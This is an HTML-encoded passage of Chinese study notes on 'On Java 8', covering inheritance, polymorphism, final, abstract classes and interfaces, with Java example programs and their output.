&#125;&#125;class Line extends Shape &#123;  private int start, end;  Line(int start, int end) &#123;    super(start);    this.start = start;    this.end = end;    System.out.println(      &quot;Drawing Line: &quot; + start + &quot;, &quot; + end);  &#125;  @Override void dispose() &#123;    System.out.println(      &quot;Erasing Line: &quot; + start + &quot;, &quot; + end);    super.dispose();  &#125;&#125;public class CADSystem extends Shape &#123;  private Circle c;  private Triangle t;  private Line[] lines = new Line[3];  public CADSystem(int i) &#123;    super(i + 1);    for(int j = 0; j &lt; lines.length; j++)      lines[j] = new Line(j, j*j);    c = new Circle(1);    t = new Triangle(1);    System.out.println(&quot;Combined constructor&quot;);  &#125;  @Override public void dispose() &#123;    System.out.println(&quot;CADSystem.dispose()&quot;);    // The order of cleanup is the reverse    // of the order of initialization:    t.dispose();    c.dispose();    for(int i = lines.length - 1; i &gt;= 0; i--)      lines[i].dispose();    super.dispose();  &#125;  public static void main(String[] args) &#123;    CADSystem x = new CADSystem(47);    try &#123;      // Code and exception handling...    &#125; finally &#123;      x.dispose();    &#125;  &#125;&#125;/* Output:Shape constructorShape constructorDrawing Line: 0, 0Shape constructorDrawing Line: 1, 1Shape constructorDrawing Line: 2, 4Shape constructorDrawing CircleShape constructorDrawing TriangleCombined constructorCADSystem.dispose()Erasing TriangleShape disposeErasing CircleShape disposeErasing Line: 2, 4Shape disposeErasing Line: 1, 1Shape disposeErasing Line: 0, 0Shape disposeShape dispose*/</code></pre><h4 id="8.4.2-%E5%90%8D%E7%A7%B0%E9%9A%90%E8%97%8F" tabindex="-1">8.4.2 名称隐藏</h4><ul><li>如果Java基类的方法名称被多次重载,则在子类中重新定义该方法名称不会隐藏任何基类版本.无论方法实在子类还是基类中定义,重载都有效<ul><li>即基类的方法名重载后,子类中依然可以进行方法名重载,均可以使用</li></ul></li></ul><pre><code class="language-java">class Homer &#123;  char doh(char c) &#123;    System.out.println(&quot;doh(char)&quot;);    return 'd';  &#125;  float doh(float f) &#123;    System.out.println(&quot;doh(float)&quot;);    return 1.0f;  &#125;&#125;class Milhouse &#123;&#125;class Bart extends Homer &#123;  void doh(Milhouse m) &#123;    System.out.println(&quot;doh(Milhouse)&quot;);  &#125;  /*  以下这种写法是错的,不是重写函数而是正常的同一函数名不同参数的重载函数,本质是同名的不同函数,相当于在子类中新造乐一个函数  @Override void doh(Milhouse m) &#123;    System.out.println(&quot;doh(Milhouse)&quot;);  &#125;  */&#125;public class Hide &#123;  public static void main(String[] args) &#123;    Bart b = new Bart();    b.doh(1);    b.doh('x');    b.doh(1.0f);    b.doh(new Milhouse());  &#125;&#125;/* Output:doh(float)doh(char)doh(float)doh(Milhouse)*/</code></pre><h3 id="8.5-%E9%80%89%E6%8B%A9%E7%BB%84%E5%90%88%E8%BF%98%E6%98%AF%E7%BB%A7%E6%89%BF" tabindex="-1">8.5 选择组合还是继承</h3><ul><li><p>组合和继承都会将对象放在新类中(组合是显式执行,继承是隐式执行)</p></li><li><p>新类中使用现有类的功能而不是接口时,使用<strong>组合</strong>,即在心累中嵌入一个对象来实现自己的特性(多是private),新类的用户看到的是新类的定义而不是嵌入对象的接口.</p><ul><li>又是组合的成员对象也可以为public(类似一种半委托)</li></ul></li><li><p>当使用<strong>继承</strong>时,通过现有的类生成一个特殊版本,意味着对通用类进行定制.</p></li><li><p><strong>继承</strong>是&quot;is-a&quot;关系,<strong>组合</strong>是&quot;has-a&quot;关系</p></li></ul><h3 id="8.6-protected%E5%85%B3%E9%94%AE%E5%AD%97" tabindex="-1">8.6 protected关键字</h3><ul><li>protected:包访问权限和子类访问权限</li></ul><pre><code class="language-java">class Villain &#123;  private String name;  protected void set(String nm) &#123; name = nm; &#125;  Villain(String name) &#123; this.name = name; &#125;  @Override public String toString() &#123;    return &quot;I'm a Villain and my name is &quot; + name;  &#125;&#125;public class Orc extends Villain &#123;  private int orcNumber;  public Orc(String name, int orcNumber) &#123;    super(name);    this.orcNumber = orcNumber;  &#125;  public void change(String name, int orcNumber) &#123;    set(name); // 这里change函数可以调用set,因为set是protected型的    this.orcNumber = orcNumber;  &#125;  @Override public String toString() &#123;    return &quot;Orc &quot; + orcNumber + &quot;: &quot; + super.toString();  &#125;  public static void main(String[] args) &#123;    Orc orc = new Orc(&quot;Limburger&quot;, 12);    System.out.println(orc);    orc.change(&quot;Bob&quot;, 19);    System.out.println(orc);  &#125;&#125;/* Output:Orc 12: I'm a Villain and my name is LimburgerOrc 19: I'm a Villain and my name is Bob*/</code></pre><h3 id="8.7-%E5%90%91%E4%B8%8A%E8%BD%AC%E5%9E%8B" tabindex="-1">8.7 向上转型</h3><ul><li>继承最重要的是可以表达新类和基类的关系:<strong>新类是现有类的一种类型</strong></li><li>这种描述可以直接由语言支持,如下面的例子,乐器类Instrument为基类,Wind为子类,乐器类有一个play方法,那么Wind乐器也会有,即Wind乐器是一种乐器</li><li>以下代码中,tune()方法接受一个Instrument引用,当传入一个Wind引用时,实际Wind类就是一种Instrument类,而且tune()方法调用的Instrument对象的所有属性和方法Wind均具有.因此代码可以正常运行.这种将子类引用转换为基类引用的行为称为<strong>向上转型(upcasting)</strong></li></ul><pre><code class="language-java">class Instrument &#123; public void play() &#123;&#125; static void tune(Instrument i) &#123; // ... i.play(); &#125;&#125;// Wind 对象也是 instrument，因为它们有相同的接口：public class Wind extends Instrument &#123; public static void main(String[] args) &#123; Wind flute = new Wind(); Instrument.tune(flute); // 向上转型 &#125;&#125;</code></pre><ul><li>确定使用继承或组合的方法:新类是否要向上转型到基类</li></ul><h3 id="8.8-final%E5%85%B3%E9%94%AE%E5%AD%97" tabindex="-1">8.8 final关键字</h3><ul><li>final:表示无法更改的</li><li>使用final出于两个原因:设计或效率,这两个原因差距很大,因此final可能被误用</li></ul><h4 id="8.8.1-final-%E6%95%B0%E6%8D%AE" tabindex="-1">8.8.1 final 数据</h4><ul><li><p>许多编程语言有常量的定义,标识某个数据是恒定的,有以下两个原因</p><ul><li><ol><li>它是一个永远不会改变的<strong>编译时常量</strong>:编译器可以将常量值&quot;折叠&quot;在计算中,即计算在编译时进行,节省运行开销.Java中使用final进行修饰,一个既是static也是final字段指挥分配一块不能改变的存储空间</li></ol></li><li><ol start="2"><li>它可以使在运行时初始化的值,而你不希望被更改</li></ol></li></ul></li><li><p>final对于基本类型,使得其值更定不变;</p></li><li><p>对于对象引用,final使得<strong>引用</strong>恒定不变,一旦引用被初始化一个对象,它就不能再指其它对象了,但对象本身是可以修改的.</p><ul><li>Java没有提供使对象恒定不变的方法,但用户可以自己编写类实现</li></ul></li></ul><ol><li>空白final: 指没有初始化的final字段,编译器会保证在使用该字段前初始化该final字段</li><li>final参数: 传递给方法的参数可以声明为final,这意味着你无法在方法中更改参数引用所指向的对象</li></ol><h4 id="8.8.2-final-%E6%96%B9%E6%B3%95" tabindex="-1">8.8.2 final 方法</h4><ul><li>使用final方法的原因<ul><li><ol><li>把方法锁定,以防任何继承类修改它的含义</li></ol></li><li><ol start="2"><li>效率:编译器在遇到final方法调用时会转为<strong>内嵌调用(inline call)</strong>,因此final方法调用的效率更高</li></ol><ul><li>具体:编译器会将final方法的代码复制到调用该方法的地方,而不是进行一次方法调用</li></ul></li></ul></li></ul><h4 id="8.8.3-final-%E7%B1%BB" tabindex="-1">8.8.3 final 类</h4><ul><li>final类不能被继承,没有类可以继承final类的任何特性</li><li>原因:<ul><li><ol><li>设计:类的创建者不希望有人继承它</li></ol></li><li><ol start="2"><li>安全:不希望其有子类,因为它的行为可能会被子类修改,而这可能会破坏原来的类</li></ol></li></ul></li></ul><h3 id="8.9-%E5%88%9D%E5%A7%8B%E5%8C%96%E5%92%8C%E7%B1%BB%E7%9A%84%E5%8A%A0%E8%BD%BD" tabindex="-1">8.9 初始化和类的加载</h3><ol><li>运行Java代码时,首先会加载类;加载类时,会先加载其基类,然后才是自身,即从根基类开始加载<ol><li>首先加载静态变量</li><li>然后是静态代码块</li></ol></li><li>创建对象时,也会从根基类开始创建,然后到自身<ol><li>首先创建实例变量(非静态)</li><li>然后是执行实例代码块</li><li>调用构造函数进行对象的初始化</li></ol></li></ol><h2 id="9-%E5%A4%9A%E6%80%81" tabindex="-1">9 多态</h2><ul><li>跟随 数据抽象,继承,多态是面向对象编程语言的第三个基本特征</li></ul><h3 id="9.1-%E5%86%8D%E8%AE%BA%E5%90%91%E4%B8%8A%E8%BD%AC%E5%9E%8B" tabindex="-1">9.1 再论向上转型</h3><ul><li>例子:乐器类Instrument为基类,Wind为子类,乐器类有一个play方法,那么Wind乐器也会有,即Wind乐器是一种乐器</li><li>以下代码中,tune()方法接受一个Instrument引用,当传入一个Wind引用时,实际Wind类就是一种Instrument类,而且tune()方法调用的Instrument对象的所有属性和方法Wind均具有.因此代码可以正常运行.这种将子类引用转换为基类引用的行为称为<strong>向上转型(upcasting)</strong></li></ul><pre><code class="language-java">class Instrument &#123; public void play(Note n) &#123; System.out.println(&quot;Instrument.play()&quot;); &#125;&#125;// Wind 对象也是 instrument，因为它们有相同的接口：public class Wind extends Instrument &#123; // 重新定义接口方法： @Override public void play(Note n) &#123;  System.out.println(&quot;Wind.play() &quot; + n); &#125; public static void main(String[] args) &#123;  Wind flute = new Wind();  Instrument.tune(flute); // 向上转型 &#125;&#125;public class Music &#123; public static void tune(Instrument i) &#123; // ... i.play(Note.MIDDLE_C); &#125; public static void main(String[] args) &#123; Wind flute = new Wind(); tune(flute); // 向上转型 &#125;&#125;</code></pre><ul><li>如果有多个继承类,编写一个以基类为参数的方法,而不用担心特定子类,即忘记子类,只与基类的代码打交道,这正是多态实现的目标</li></ul><h3 id="9.2-%E9%9A%BE%E7%82%B9" tabindex="-1">9.2 难点</h3><ul><li>在mucis.java中 Music.tune()方法接受一个Instrument引用,但是传入的是Wind引用,这是如何实现的呢?<ul><li>此时需要了解<strong>绑定</strong>这个主题</li></ul></li></ul><h4 id="9.2.1-%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%E7%BB%91%E5%AE%9A" tabindex="-1">9.2.1 方法调用绑定</h4><ul><li>绑定:将一个方法调用和一个方法体实现关联起来称为绑定</li><li>前期绑定:在程序运行之前执行绑定(编译器和连接程序都可以执行前期绑定,因此有时也称为静态绑定)<ul><li>面向过程语言中,大多数方法调用都是前期绑定</li></ul></li><li>后期绑定(也称动态绑定,运行时绑定):在运行时根据对象的类型进行绑定<ul><li>多态的实现就是后期绑定</li><li>Java的所有方法都是后期绑定的,除非明确指定final,static或private</li></ul></li></ul><h4 id="9.2.2-%E4%BA%A7%E7%94%9F%E6%AD%A3%E7%A1%AE%E7%9A%84%E8%A1%8C%E4%B8%BA" tabindex="-1">9.2.2 产生正确的行为</h4><ul><li>例子:Instrument类中的play()方法,在Wind类中被覆盖,当调用tune()方法时,传入的是Wind引用,但是调用的是Instrument类中的play()方法,这是如何实现的呢?<ul><li><ol><li>传入Wind引用时,会将Wind引用向上转型为Instrument引用</li></ol></li><li><ol start="2"><li>调用Instrument类中的play()方法,此时会调用Wind类中的play()方法,因为Wind类中覆盖了Instrument类中的play()方法</li></ol></li><li><ol start="3"><li>由于是后期绑定,因此会调用Wind类中的play()方法,而不是Instrument类中的play()方法</li></ol></li></ul></li></ul><h4 id="9.2.3-%E5%8F%AF%E6%89%A9%E5%B1%95%E6%80%A7" tabindex="-1">9.2.3 可扩展性</h4><ul><li>例子:如果需要添加一个新的乐器,只需要继承Instrument类,并覆盖play()方法即可,不需要修改任何其他代码,即tune方法的参数一直是Instrument类,但是传入的是新的乐器引用,此时调用的是新乐器的play()方法,这就是多态的可扩展性</li></ul><h4 id="9.2.4-%E9%99%B7%E9%98%B1%3A%22%E9%87%8D%E5%86%99%22private%E6%96%B9%E6%B3%95" tabindex="-1">9.2.4 陷阱:&quot;重写&quot;private方法</h4><p><img src="/images/PL/OnJava8/9_2_4.png" alt></p><ul><li>private 方法为隐式的final,不能被覆盖,此时子类中的方法即为一个新的方法,因此子类中的方法和基类中的方法没有任何关系,此时调用的是基类中的方法</li><li>如果在子类中使用@Override注解,编译器会报错</li></ul><h4 id="9.2.5-%E9%99%B7%E9%98%B1%3A%E5%AD%97%E6%AE%B5%E5%92%8C%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95" tabindex="-1">9.2.5 陷阱:字段和静态方法</h4><ul><li>只用普通的方法调用可以是多态的,但是字段和静态方法不行<ul><li>如果直接访问一个字段,该访问会在编译时解析</li><li>静态方法与类相关联,而不是与单个的对象相关联</li></ul></li></ul><h3 id="9.3-%E6%9E%84%E9%80%A0%E5%99%A8%E5%92%8C%E5%A4%9A%E6%80%81" tabindex="-1">9.3 构造器和多态</h3><h4 id="9.3.1-%E6%9E%84%E9%80%A0%E5%99%A8%E7%9A%84%E8%B0%83%E7%94%A8%E9%A1%BA%E5%BA%8F" tabindex="-1">9.3.1 构造器的调用顺序</h4><ul><li>调用子类构造器,此时会递归调用子类的基类构造器,直到调用根基类构造器</li><li>如果没有在子类构造器代码中显式调用基类构造器,则会隐式的调用基类的无参构造器</li><li>一个复杂对象构造器的调用顺序<ul><li><ol><li>调用基类构造器,此时会递归调用基类的基类构造器,直到调用根基类构造器.根类先被构造,随后到子类</li></ol></li><li><ol start="2"><li>按声明顺序初始化成员</li></ol></li><li><ol start="3"><li>调用子类构造器的主体</li></ol></li></ul></li></ul><h4 id="9.3.2-%E7%BB%A7%E6%89%BF%E4%B8%8E%E6%B8%85%E7%90%86" tabindex="-1">9.3.2 继承与清理</h4><ul><li>通常由gc进行清理,如有自己清理的必要,需要自行创建dispose函数,并在子类中覆盖该函数,在子类中调用基类的dispose函数</li><li>清理的顺序是从子类到根基类</li></ul><h4 id="9.3.3-%E6%9E%84%E9%80%A0%E5%99%A8%E5%86%85%E9%83%A8%E7%9A%84%E5%A4%9A%E6%80%81%E6%96%B9%E6%B3%95%E7%9A%84%E8%A1%8C%E4%B8%BA" tabindex="-1">9.3.3 构造器内部的多态方法的行为</h4><ul><li><p>普通方法中,动态绑定调用在运行时解析</p></li><li><p>过早其中中调用动态绑定方法,会调用该方法被重写后的定义,但被重写的方法可能会使用到子类中的成员变量,此时子类的成员变量还未被初始化,因此会出现错误</p></li><li><p>编写构造器的准则:</p><ul><li>用尽可能少的操作使对象进入正常状态</li><li>如果可以的话,避免调用其他方法,只有基类中final,private方法可以在构造器中被安全调用</li></ul></li></ul><h3 id="9.4-%E5%8D%8F%E5%8F%98%E8%BF%94%E5%9B%9E%E7%B1%BB%E5%9E%8B" tabindex="-1">9.4 协变返回类型</h3><ul><li>Java5中添加了 <strong>协变返回类型(covariant return type)<strong>重写方法时,返回类型可以是基类方法返回类型的</strong>子类型</strong></li><li>例子:process的返回类型:在WheatMill中process函数返回的是Wheat类型,而在Mill中返回的是Grain类型,此时Wheat是Grain的子类,因此可以使用协变返回类型</li></ul><pre><code class="language-java">class Grain &#123; @Override public String toString() &#123; return &quot;Grain&quot;; &#125;&#125;class Wheat extends Grain &#123; @Override public String toString() &#123; return &quot;Wheat&quot;; &#125;&#125;class Mill &#123; Grain process() &#123; return new Grain(); &#125;&#125;class WheatMill extends Mill &#123; @Override Wheat process() &#123; return new Wheat(); &#125;&#125;</code></pre><h3 id="9.5-%E7%94%A8%E7%BB%A7%E6%89%BF%E8%BF%9B%E8%A1%8C%E8%AE%BE%E8%AE%A1" tabindex="-1">9.5 用继承进行设计</h3><ul><li>设计准则:使用继承表达行为间的差异,使用字段表达状态上的变化</li></ul><h4 id="9.5.1-%E6%9B%BF%E6%8D%A2%E5%92%8C%E6%89%A9%E5%B1%95" tabindex="-1">9.5.1 替换和扩展</h4><ul><li><p>纯粹的&quot;is-a&quot;关系,子类的接口与基类相同,但可以进行重写.例子:<br><img src="/images/PL/OnJava8/9_5_1.png" alt></p></li><li><p>&quot;is-like-a&quot;关系,子类的接口比基类更丰富,向上转型后,无法调用子类的新的方法.例子:<br><img src="/images/PL/OnJava8/9_5_1_1.png" alt></p></li></ul><h4 id="9.5.2-%E5%90%91%E4%B8%8B%E8%BD%AC%E5%9E%8B%E5%92%8C%E5%8F%8D%E5%B0%84" tabindex="-1">9.5.2 向下转型和反射</h4><ul><li><p>向上转型会丢失特定类型的信息,自然可以通过向下转型重新获取类型信息</p></li><li><p>向上转型总是安全的,因为基类不可能会比有更多的接口,基类接口发送的信息子类总能接收,向下转型非也</p></li><li><p>某些语言(如C++)要执行特殊操作才能获得类型安全的向下转型,Java中每个转型都会被检查,如果转型是不合法的,则会抛出ClassCastException异常,这种运行时检查的行为是<strong>Java反射</strong>的一部分,例子:</p></li></ul><pre><code class="language-java">class Useful &#123; public void f() &#123;&#125; public void g() &#123;&#125;&#125;class MoreUseful extends Useful &#123; @Override public void f() &#123;&#125; @Override public void g() &#123;&#125; public void u() &#123;&#125; public void v() &#123;&#125; public void w() &#123;&#125;&#125;public class Reflect &#123; public static void main(String[] args) &#123; Useful[] x = &#123; new Useful(), new MoreUseful() &#125;; x[0].f(); x[1].g(); // 编译时错误：无法在 Useful 中发现方法 : //- x[1].u(); ((MoreUseful)x[1]).u(); // 向下转型 / 反射 ((MoreUseful)x[0]).u(); // 抛出异常 &#125;&#125;</code></pre><h2 id="10-%E6%8E%A5%E5%8F%A3" tabindex="-1">10 接口</h2><h3 id="10.1-%E6%8A%BD%E8%B1%A1%E7%B1%BB%E5%92%8C%E6%8A%BD%E8%B1%A1%E6%96%B9%E6%B3%95" tabindex="-1">10.1 抽象类和抽象方法</h3><ul><li><p>抽象类:介于普通类和接口之间的类,抽象类不能被实例化,只能被继承,抽象类中可以包含<strong>抽象方法</strong>,也可以没有,抽象方法只有声明,没有实现,抽象方法必须被子类实现</p></li><li><p>例子:Instrument可以称为抽象类,为所有的子类创建了一个共同的接口,但是Instrument类本身不能被实例化,因为它是抽象的,而且Instrument类中的play方法是抽象的,因此必须被子类实现</p></li></ul><pre><code class="language-java">abstract class Instrument &#123; private int i;  public abstract void play(Note n); public String what() &#123; return &quot;Instrument&quot;; &#125; public abstract void adjust();&#125;</code></pre><ul><li>可实例化类继承抽象类后,要为所有的抽象方法提供定义</li></ul><pre><code class="language-java">abstract class Uninstantiable &#123;  abstract void f();  abstract int g();&#125;public class Instantiable extends Uninstantiable &#123;  @Override void f() &#123; System.out.println(&quot;f()&quot;); &#125;//@Override表示重写了基类的方法,如果该注解,其实编译器会自动判断抽象方法是否已经被实现,所以可以去掉  @Override int g() &#123; return 22; &#125;  public static void main(String[] args) &#123;    Uninstantiable ui = new Instantiable();ui.f();  &#125;&#125;</code></pre><ul><li><p>接口只允许有public方法,抽象类对访问权限没有限制(private方法除外,因为无法被继承)</p></li><li><p>抽象类和抽象方法很有用</p><ul><li>明确了类的抽象性,告诉用户和编译器自己的预期用途</li><li>有用的重构工具,让你轻松地将公共方法上移至抽象基类中,以便于在继承类中重用</li></ul></li></ul><h3 id="10.2-%E6%8E%A5%E5%8F%A3%E5%AE%9A%E4%B9%89" tabindex="-1">10.2 接口定义</h3><ul><li><p>interface关键字创建一个完全抽象的类,不代表任何实现,接口描述了一个类应该是什么样子和做什么的,而不是如何做.其确定了方法名,参数列表和返回类型,但不提供方法主体.</p></li><li><p>接口允许默认方法和静态方法,可以包含字段(隐式static和final)</p></li><li><p>接口和抽象类显著的区别是两者的惯用方式:</p><ul><li>接口通常暗示&quot;类的类型&quot;,作为形容词使用,如Comparable接口</li><li>抽象类通常表示&quot;类的成员&quot;,作为名词使用,如AbstractList类</li></ul></li><li><p>创建接口使用interface关键字,前面可以加public或默认包访问权限</p></li><li><p>创建符合接口的类,使用implements关键字,一个类可以实现多个接口,接口中的方法必须被实现,否则编译报错.同时方法默认为public,同时实现类中的方法也必须为public,加上@Override注解可以检查是否正确重写了接口中的方法</p></li></ul><pre><code class="language-java">interface Concept &#123; // 包访问 void idea1(); void idea2();&#125;class Implementation implements Concept &#123; @Override public void idea1() &#123; System.out.println(&quot;idea1&quot;); &#125; @Override public void idea2() &#123; System.out.println(&quot;idea2&quot;); &#125;&#125;</code></pre><h4 id="10.2.1-%E9%BB%98%E8%AE%A4%E6%96%B9%E6%B3%95" tabindex="-1">10.2.1 默认方法</h4><ul><li>接口中,允许使用default关键字创建一个方法体,实现该接口的类可以在不定义方法的情况下直接替换为该默认方法体</li></ul><pre><code class="language-java">interface InterfaceWithDefault &#123; void firstMethod(); void secondMethod(); default void newMethod() &#123; System.out.println(&quot;newMethod&quot;); &#125;&#125;public class Implementation2implements InterfaceWithDefault &#123; @Override public void firstMethod() &#123; System.out.println(&quot;firstMethod&quot;); &#125; @Override public void secondMethod() &#123; System.out.println(&quot;secondMethod&quot;); &#125; public static void main(String[] args) &#123; InterfaceWithDefault i = new Implementation2(); i.firstMethod(); i.secondMethod(); i.newMethod(); &#125;&#125;</code></pre><ul><li>添加默认方法的原因:允许向现有接口中添加方法,而不会破坏已经在使用该接口的所有代码</li><li>默认方法也称 防御方法 或 虚拟扩展方法</li></ul><h4 id="10.2.2-%E5%A4%9A%E9%87%8D%E7%BB%A7%E6%89%BF" tabindex="-1">10.2.2 多重继承</h4><ul><li>Java是严格的单继承语言,只能继承一个类(或抽象类)</li><li>但接口有多重继承的一些特性,即一个类可以实现多个接口,这样就可以实现多重继承的效果,只要所有基类方法都有不同的名称和参数列表,代码就能正常工作,否则会报错<ul><li>如果两个接口中有相同的方法,可以通过在实现类中重写该方法来解决</li></ul></li></ul><pre><code class="language-java">interface Jim1 &#123; default void jim() &#123; System.out.println(&quot;Jim1::jim&quot;); &#125;&#125;interface Jim2 &#123; default void jim() &#123; System.out.println(&quot;Jim2::jim&quot;); &#125;&#125;public class Jim implements Jim1, Jim2 &#123; @Override public void jim() &#123; Jim2.super.jim(); &#125; public static void main(String[] args) &#123; new Jim().jim(); &#125;&#125;</code></pre><h4 id="10.2.3-%E6%8E%A5%E5%8F%A3%E4%B8%AD%E7%9A%84%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95" tabindex="-1">10.2.3 接口中的静态方法</h4><ul><li>Java8允许在接口中包含静态方法,允许在接口里包含逻辑上属于它的实用程序<ul><li>如 runOps()这种操作该接口的方法</li><li>show()通用工具</li></ul></li></ul><pre><code class="language-java">public interface Operation &#123;  void execute();  static void runOps(Operation... ops) &#123;    for(Operation op : ops)    op.execute();  &#125;  static void show(String msg) &#123;    System.out.println(msg);  &#125;&#125;class Heat implements Operation &#123;  @Override public void execute() &#123;    Operation.show(&quot;Heat&quot;);  &#125;&#125;public class MetalWork &#123;  public static void main(String[] args) &#123;    // 必须在静态上下文中定义才能使用方法引用    Operation twist = new Operation() &#123;      public void execute() &#123;        Operation.show(&quot;Twist&quot;);      &#125;    &#125;;    Operation.runOps(      new Heat(), // [1] 常规类 Heat      new Operation() &#123; // [2] 匿名内部类        public void execute() &#123;          Operation.show(&quot;Hammer&quot;);        &#125;      &#125;,      twist::execute, // [3] 方法引用      () -&gt; Operation.show(&quot;Anneal&quot;) // [4] Lambda表达式    );  &#125;&#125;</code></pre><h3 id="10.3-%E6%8A%BD%E8%B1%A1%E7%B1%BB%E5%92%8C%E6%8E%A5%E5%8F%A3" tabindex="-1">10.3 抽象类和接口</h3><table><tr><th>特性</th><th>接口</th><th>抽象类</th></tr><tr><td>组合</td><td>可以在新类中组合多个接口</td><td>只能继承一个抽象类</td></tr><tr><td>状态</td><td>不能包含字段(静态字段除外,但它们不支持对象状态)</td><td>可以包含字段,非抽象方法可以引用这些字段</td></tr><tr><td>默认方法和抽象方法</td><td>默认方法不需要在子类型里实现,它只能引用接口里的方法(字段不行)</td><td>抽象方法必须在子类型中实现</td></tr><tr><td>构造器</td><td>不能有构造器</td><td>可以有构造器</td></tr><tr><td>访问权限控制</td><td>隐式的public</td><td>可以为protected或包访问权限</td></tr></table><ul><li>在合理的范围内尽可能抽象.因此二者相比更偏向使用接口.大多数情况下,常规类就能解决问题</li></ul><h3 id="10.4-%E5%AE%8C%E5%85%A8%E8%A7%A3%E8%80%A6" tabindex="-1">10.4 完全解耦</h3><ul><li><p>方法与类配合使用时,只能使用该类或其子类;与接口配合时,可以使用任何实现了该接口的类</p></li><li><p>接口的一个重要特性是,它们与实现部分完全解耦,即使只修改接口,也不会影响现有的实现部分,因此接口是代码演化的关键</p></li><li><p>例子:Processor接口,可以被任何Processor实现类使用,而不需要知道Processor实现类的具体细节,只需要知道Processor实现类的接口即可,同时其他实现类也可以使用Processor接口,这就是完全解耦的好处</p></li></ul><pre><code class="language-java">interface Processor &#123;  String name();  Object process(Object input);&#125;class Upcase implements Processor &#123;  @Override public String name() &#123; return getClass().getSimpleName(); &#125;  @Override public String process(Object input) &#123;    return ((String)input).toUpperCase();  &#125;&#125;class Downcase implements Processor &#123;  @Override public String name() &#123; return getClass().getSimpleName(); &#125;  @Override public String process(Object input) &#123;    return ((String)input).toLowerCase();  &#125;&#125;class Splitter implements Processor &#123;  @Override public String name() &#123; return getClass().getSimpleName(); &#125;  @Override public String process(Object input) &#123;    return Arrays.toString(((String)input).split(&quot; &quot;));  &#125;&#125;public class Apply &#123;  public static void process(Processor p, Object s) &#123;    System.out.println(&quot;Using Processor &quot; + p.name());    System.out.println(p.process(s));  &#125;  public static String s =    &quot;Disagreement with beliefs is by definition incorrect&quot;;  public static void main(String[] args) &#123;    process(new Upcase(), s);    process(new Downcase(), s);    process(new Splitter(), s);  &#125;&#125;class FilterAdapter implements Processor &#123;  Filter filter;  FilterAdapter(Filter filter) &#123;    this.filter = filter;  &#125;  @Override  public String name() &#123; return filter.name(); &#125;  @Override  public Waveform process(Object input) &#123;    return filter.process((Waveform)input);  &#125;&#125;</code></pre><h3 id="10.5-%E7%BB%84%E5%90%88%E5%A4%9A%E4%B8%AA%E6%8E%A5%E5%8F%A3" tabindex="-1">10.5 组合多个接口</h3><ul><li>Java中,一个实现类只能继承自一个类,但可以继承自多个接口;代码中先使用extend关键字,再使用implements关键字</li></ul><pre><code class="language-java">interface CanFight &#123;  void fight();&#125;interface CanSwim &#123;  void swim();&#125;interface CanFly &#123;  void fly();&#125;class ActionCharacter &#123;  public void fight() &#123;&#125;&#125;class Hero extends ActionCharacter  implements CanFight, CanSwim, CanFly &#123;  @Override public void swim() &#123;&#125;  @Override public void fly() &#123;&#125;  //CanFight中的fight()方法已经在ActionCharacter中实现,因此Hero中不需要重写&#125;public class Adventure &#123;  public static void t(CanFight x) &#123; x.fight(); &#125;  public static void u(CanSwim x) &#123; x.swim(); &#125;  public static void v(CanFly x) &#123; x.fly(); &#125;  public static void w(ActionCharacter x) &#123; x.fight(); &#125;  public static void main(String[] args) &#123;    Hero h = new Hero();    t(h); // 当作一个 CanFight 类型    u(h); // 当作一个 CanSwim 类型    v(h); // 当作一个 CanFly 类型    w(h); // 当作一个 ActionCharacter 类型  &#125;&#125;</code></pre><ul><li><p>使用接口的核心原因</p><ul><li>向上转型为多个基类型,以及由此带来的灵活性</li><li>防止客户端程序员创建该类的对象,并确保该类的实现己经具备了某些特定的行为</li></ul></li><li><p>使用接口还是抽象类?</p><ul><li>如果要创建不带任何方法定义和成员变量的基类,那么就应该选择接口而不是抽象类</li></ul></li></ul><h3 id="10.6-%E9%80%9A%E8%BF%87%E7%BB%A7%E6%89%BF%E6%89%A9%E5%B1%95%E6%8E%A5%E5%8F%A3" tabindex="-1">10.6 通过继承扩展接口</h3><ul><li>可以使用继承向接口里添加新的方法声明,也可以将多个接口组合成一个新接口</li></ul><pre><code class="language-java">interface Monster &#123; void menace();&#125;interface DangerousMonster extends Monster &#123; void destroy();&#125;interface Lethal &#123; void kill();&#125;interface Vampire extends DangerousMonster, Lethal &#123; void drinkBlood();&#125;</code></pre><ul><li>当接口组合在一起时,应避免使用相同的方法名,否则会出现歧义</li></ul><h3 id="10.7-%E9%80%82%E9%85%8D%E6%8E%A5%E5%8F%A3" tabindex="-1">10.7 适配接口</h3><ul><li>接口的常见用途:策略设计模式<ul><li><ol><li>编写一个执行某些操作的方法,该方法指定某些接口作为参数</li></ol></li><li><ol start="2"><li>该方法可以操作任何对象,只要该对象遵循我的接口</li></ol></li></ul></li><li>例子:Scanner类的构造器接受一个Readable接口作为参数,因此只要你创建的新类实现Readable接口,就可以将该类的对象传递给Scanner类的构造器</li></ul><pre><code class="language-java">import java.nio.*;import java.util.*;public class RandomStrings implements Readable &#123;  private static Random rand = new Random(47);  private static final char[] CAPITALS = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;.toCharArray();  private static final char[] LOWERS = &quot;abcdefghijklmnopqrstuvwxyz&quot;.toCharArray();  private static final char[] VOWELS = &quot;aeiou&quot;.toCharArray();  private int count;  public RandomStrings(int count) &#123;this.count = count;&#125;  @Override public int read(CharBuffer cb) &#123;    if(count-- == 0)      return -1; // 表示输入已经结束    cb.append(CAPITALS[rand.nextInt(CAPITALS.length)]);    for(int i = 0; i &lt; 4; i++) &#123;      cb.append(VOWELS[rand.nextInt(VOWELS.length)]);      cb.append(LOWERS[rand.nextInt(LOWERS.length)]);    &#125;  cb.append(&quot; &quot;);  return 10; // 添加的字符串 &#125; public static void main(String[] args) &#123;    Scanner s = new Scanner(new RandomStrings(10));    while(s.hasNext()) System.out.println(s.next());  &#125;&#125;</code></pre><ul><li>任何类都可以实现接口,因此可以使用适配器模式,将接口与你想要的任何类结合起来,适配器中的代码将接受你所拥有的接口,并产生你所需要的接口</li></ul><h3 id="10.8-%E6%8E%A5%E5%8F%A3%E4%B8%AD%E7%9A%84%E5%AD%97%E6%AE%B5" tabindex="-1">10.8 接口中的字段</h3><ul><li>接口中的字段默认为static和final,因此接口中的字段必须被初始化,且不能被修改,因此接口是一种很好的创建常量的方法,Java5之后有enum,因此不需要使用接口来创建常量<ul><li>Java里具有常量初始值的 static final 字段的命名全部使用大写字母(用下划线分割单个标识符中的多个单词)</li></ul></li></ul><h3 